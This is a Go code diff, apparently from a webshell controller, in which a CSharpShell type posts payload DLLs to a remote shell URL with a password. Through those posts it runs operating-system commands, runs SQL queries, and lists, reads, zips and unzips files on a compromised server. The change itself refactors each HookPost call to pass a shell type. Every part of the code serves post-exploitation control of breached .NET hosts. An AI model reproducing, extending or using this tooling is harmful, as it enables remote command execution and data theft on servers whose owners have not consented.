@@ -10,7 +10,7 @@ import (
 var NetSessions map[int]string
 
 func (s *CSharpShell) GetShellType() string {
-	return "csharp"
+	return "net"
 }
 
 func (s *CSharpShell) FreshSession(id int, url string, password string) (string, error) {
@@ -45,7 +45,7 @@ func (s *CSharpShell) FreshSession(id int, url string, password string) (string,
 // BaseInfo
 func (s *CSharpShell) BaseInfo(id int, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/BaseInfo.dll")
-	res, err := util.HookPost(url, password, string(code), NetSessions[id])
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", err
 	}
@@ -55,7 +55,7 @@ func (s *CSharpShell) BaseInfo(id int, url string, password string) (string, err
 
 func (s *CSharpShell) ExecCommand(id int, command string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/OS.dll")
-	osType, err := util.HookPost(url, password, string(code), NetSessions[id])
+	osType, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -68,7 +68,7 @@ func (s *CSharpShell) ExecCommand(id int, command string, url string, password s
 
 	code, _ = os.ReadFile("./pkg/api/net/CMD.dll")
 	code = fmt.Appendf(code, "_____cmdPath-%s,exit-true,cmd-%s", cmdPath, command)
-	res, err := util.HookPost(url, password, string(code), password)
+	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -90,7 +90,7 @@ func (s *CSharpShell) ExecSql(id int, driver, host, port, user, pass, database, 
 			driver, host, port, user, pass, database, sql, option, encoding)
 	}
 
-	res, err := util.HookPost(url, password, string(code), password)
+	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -100,7 +100,7 @@ func (s *CSharpShell) ExecSql(id int, driver, host, port, user, pass, database, 
 func (s *CSharpShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileZip.dll")
 	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
-	res, err := util.HookPost(url, password, string(code), password)
+	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -109,7 +109,7 @@ func (s *CSharpShell) FileZip(id int, srcPath string, toPath string, url string,
 func (s *CSharpShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileUnZip.dll")
 	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
-	res, err := util.HookPost(url, password, string(code), password)
+	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -120,7 +120,7 @@ func (s *CSharpShell) FileUnZip(id int, srcPath string, toPath string, url strin
 func (s *CSharpShell) FileList(id int, path string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileList.dll")
 	code = fmt.Appendf(code, "_____path-%s", path)
-	res, err := util.HookPost(url, password, string(code), password)
+	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -130,7 +130,7 @@ func (s *CSharpShell) FileList(id int, path string, url string, password string)
 func (s *CSharpShell) FileShow(id int, path string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileShow.dll")
 	code = fmt.Appendf(code, "_____path-%s", path)
-	res, err := util.HookPost(url, password, string(code), password)
+	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
